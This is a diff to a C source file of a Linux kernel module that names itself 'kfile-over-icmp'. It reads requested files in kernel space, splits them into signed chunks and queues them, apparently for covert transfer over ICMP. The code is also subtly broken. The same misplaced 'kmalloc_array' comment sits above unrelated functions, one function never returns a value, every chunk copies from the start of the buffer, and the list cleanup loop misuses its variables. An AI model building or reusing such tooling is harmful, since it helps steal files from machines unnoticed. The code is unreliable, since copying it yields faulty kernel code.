@@ -2,6 +2,8 @@
 #include <linux/uaccess.h>
 #include <linux/kthread.h>
 #include <linux/sched.h>
+#include <linux/version.h>
+#include <linux/vmalloc.h>
 
 #include "payload_generator.h"
 #include "file_metadata.h"
@@ -10,13 +12,112 @@
 LIST_HEAD(g_chunk_list);
 DEFINE_SPINLOCK(g_chunk_list_spinlock);
 
+LIST_HEAD(g_data_modifiers_list);
+
 struct task_struct* g_payload_generator_thread;
 unsigned int g_payload_generator_thread_stop = 0;
 
 static const char* payload_generator_thread_name = "kpayload";
 
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ */
 int read_file_thread_func(void* data);
 
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ */
+ssize_t safe_read_from_file(struct file *filp, char *file_data, size_t file_size, loff_t *current_position)
+{
+    // Read the file's content.
+    // Few important notes:
+    //      1. Traditionally, the common way of reading files in the kernel is by using VFS functions 
+    //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. In newer kernel
+    //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
+    //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
+    //         eliminates the need of messing with the FS (explained in 2). However, and from a very 
+    //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
+    //      2. vfs_read expects to save the read data into a user-space buffer. In order to pass a 
+    //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. By setting the
+    //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. Note that
+    //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
+    //         will be caused.
+    mm_segment_t security_old_fs = get_fs();
+    set_fs(get_ds());
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
+    ssize_t size_read = vfs_read(filp, file_data, file_size, current_position);
+#else
+    ssize_t size_read = kernel_read(filp, file_data, file_size, current_position);
+#endif
+    set_fs(security_old_fs);  
+
+    return size_read;  
+}
+
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ */
+void copy_signature_to_chunk(struct file_chunk *chunk, size_t file_size)
+{
+    // If it is the first chunk, we want to add a signature to it.
+    struct new_file_signature signature;
+    signature.file_size = file_size;
+
+    memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));
+    memcpy(chunk->data, &signature, sizeof(struct new_file_signature));
+    chunk->chunk_size += sizeof(struct new_file_signature);
+}
+
+int payload_generator_add_modifier(data_modifier_func func)
+{
+    struct data_modifier *modifier = (struct data_modifier *)kmalloc(sizeof(struct data_modifier), GFP_KERNEL);
+    if (NULL == modifier) {
+        return -ENOMEM;
+    }
+
+    modifier->func = func;
+
+    INIT_LIST_HEAD(&(modifier->l_head));
+    list_add(&(modifier->l_head), &g_data_modifiers_list);
+}
+
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ * @note: no need to use locks as no one accesses the modifiers list in runtime.
+ */
+int run_data_modifiers_on_data(char *data, ssize_t *len)
+{ 
+    struct data_modifier *modifier;
+    bool is_modifier_failed = false;
+    list_for_each_entry(modifier, &g_data_modifiers_list, l_head) {
+        if (modifier->func(data, len)) {
+            // TODO: keep going or abort?
+            is_modifier_failed = true;
+            break;
+        }
+    }
+
+    return is_modifier_failed ? -EINVAL : 0;
+}
+
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ */
 void read_file_chunks(const char* file_path)
 {
     // Open the file from user-space.
@@ -32,21 +133,36 @@ void read_file_chunks(const char* file_path)
     loff_t current_position = vfs_llseek(filp, 0, 0);
     if (0 != current_position) {
         printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", file_path);
-        goto cleanup;
+        goto close_filp;
     }
 
-    // Read the file, split it to chunks and add them to the chunks list
+    // 1. allocate data with size same as file_size, with vmalloc.
+    char *file_data = (char*)vmalloc(file_size);
+    if (NULL == file_data) {
+        goto close_filp;
+    }
+
+    // Read the file's content.
+    //ssize_t size_read = size_to_read;
+    //current_position += size_to_read;
+    ssize_t size_read = safe_read_from_file(filp, file_data, file_size, &current_position);
+
+    // 3. run any modifiers on the file data
+    run_data_modifiers_on_data(file_data, (ssize_t *)&file_size);
+
+    // Split the file data to chunks
     bool is_first_chunk = true;
+    current_position = 0;
     while (current_position < file_size) {
         struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_ATOMIC);
         if (NULL == new_chunk) {
-            goto cleanup;
+            goto free_vmalloc;
         }
 
         new_chunk->data = (char *)kmalloc(get_default_payload_chunk_size(), GFP_ATOMIC);
         if (NULL == new_chunk->data) {
             kfree(new_chunk);
-            goto cleanup;
+            goto free_vmalloc;
         }
 
         new_chunk->chunk_size = 0;
@@ -56,39 +172,16 @@ void read_file_chunks(const char* file_path)
 
         if (is_first_chunk) {
             // If it is the first chunk, we want to add a signature to it.
-            struct new_file_signature signature;
-            signature.file_size = file_size;
-            memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));
-
-            memcpy(new_chunk->data, &signature, sizeof(struct new_file_signature));
-
-            new_chunk->chunk_size += sizeof(struct new_file_signature);
+            copy_signature_to_chunk(new_chunk, file_size);
             offset_in_buffer += sizeof(struct new_file_signature);
             available_space_in_chunk -= sizeof(struct new_file_signature);
             is_first_chunk = false;
         }
 
         ssize_t size_to_read = min(available_space_in_chunk, (size_t)(file_size - current_position));
-
-        // Read the file's content.
-        // Few important notes:
-        //      1. Traditionally, the common way of reading files in the kernel is by using VFS functions 
-        //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. In newer kernel
-        //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
-        //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
-        //         eliminates the need of messing with the FS (explained in 2). However, and from a very 
-        //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
-        //      2. vfs_read expects to save the read data into a user-space buffer. In order to pass a 
-        //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. By setting the
-        //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. Note that
-        //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
-        //         will be caused.
-        mm_segment_t security_old_fs = get_fs();
-        set_fs(get_ds());
-        ssize_t size_read = vfs_read(filp, new_chunk->data + offset_in_buffer, size_to_read, &current_position);
-        set_fs(security_old_fs);
-
-        new_chunk->chunk_size += size_read;
+        memcpy(new_chunk->data + offset_in_buffer, file_data, size_to_read);
+        new_chunk->chunk_size += size_to_read;
+        current_position += size_to_read;
 
         unsigned long flags;
         spin_lock_irqsave(&g_chunk_list_spinlock, flags);
@@ -96,16 +189,25 @@ void read_file_chunks(const char* file_path)
         spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);
     }
 
-cleanup:
+free_vmalloc:
+    vfree(file_data);
+close_filp:
     filp_close(filp, NULL);
 }
 
+/**
+ * kmalloc_array - allocate memory for an array.
+ * @n: number of elements.
+ * @size: element size.
+ * @flags: the type of memory to allocate (see kmalloc).
+ */
 void process_next_pending_file(void)
 {    
+    printk(KERN_ERR "#1\n");
+
     mutex_lock(&g_requestd_files_list_mutex);
     bool is_list_empty = list_empty(&g_requestd_files_list);
     mutex_unlock(&g_requestd_files_list_mutex);
-
     if (is_list_empty) {
         // There are no pending files.
         return;    
@@ -140,9 +242,13 @@ void process_next_pending_file(void)
     kfree(next_pending_file->file_path);
     kfree(next_pending_file);
 
+    printk(KERN_ERR "#2\n");
+
     // TODO: support saving only X chunks (for dealing with large files)
     // No need to acquire chunks_list_mutex as read_file_chunks does that internally.
     read_file_chunks(file_path);
+
+    printk(KERN_ERR "#3\n");
 
     return;
 
@@ -215,7 +321,20 @@ void stop_payload_generator_thread(void)
 {
     g_payload_generator_thread_stop = 1;
     kthread_stop(g_payload_generator_thread);
-    put_task_struct(g_payload_generator_thread);    
+    put_task_struct(g_payload_generator_thread);  
+
+    // empty the modifiers list
+    struct list_head *pos = NULL;
+    struct list_head *tmp = NULL;
+    struct data_modifier *modifier = NULL;
+    list_for_each_safe(modifier, tmp, &g_data_modifiers_list) {
+        modifier = list_entry(pos, struct data_modifier, l_head);
+        if (NULL == modifier) {
+            continue;
+        }
+        list_del(pos);
+        kfree(modifier);
+    }
 }
 
 size_t get_default_payload_chunk_size(void)
